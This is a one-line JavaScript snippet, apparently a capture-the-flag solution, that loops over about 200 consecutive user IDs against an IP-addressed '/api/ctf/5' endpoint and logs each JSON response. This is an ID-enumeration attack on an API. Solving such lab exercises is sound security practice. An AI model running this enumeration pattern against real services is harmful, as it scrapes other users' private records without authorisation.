```js
for(let i = 0;i<=200;i++){fetch(`http://45.113.201.36/api/ctf/5?uid=${100336890 + i}`).then(res=>res.json()).then(res=>console.log(res))}
```